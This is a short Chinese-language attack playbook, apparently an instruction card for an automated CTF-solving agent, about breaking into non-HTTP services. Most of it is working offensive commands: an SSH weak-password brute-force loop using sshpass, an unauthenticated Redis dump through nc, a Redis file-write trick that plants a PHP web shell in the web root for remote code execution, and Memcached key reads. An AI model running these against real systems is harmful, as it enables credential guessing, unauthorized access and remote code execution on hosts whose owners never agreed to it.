# port 端口 / 服务直打

适用：非 HTTP 服务（SSH/Redis/FTP/MySQL/Memcached）、平台给的端口无响应、多服务主机。

打法：
- SSH：banner 看版本；弱口令一条命令：
  for u in root admin test vagrant ubuntu; do for w in root toor admin password 123456 vagrant; do sshpass -p $w ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $u@HOST true 2>/dev/null && echo "OK $u:$w" && break; done; done
- Redis 未授权：printf 'CONFIG GET *\r\nKEYS *\r\nGET flag*\r\n' | timeout 5 nc HOST 6379
- 写文件 RCE：CONFIG SET dir /var/www/html → SET x "<?php system($_GET[0]);?>" → SAVE。
- MySQL/FTP 同理弱口令；Memcached：stats items → 用 nc 直读 KEY flag*。
- 邻近端口扫 -p4990-5010（平台常用偏移），禁用 nmap -p- 全量扫。

判定：banner/认证成功/KEYS 出 flag → fact(kind=service|creds)。

停止：每服务 2 组凭据失败且无未授权访问，标 dead。
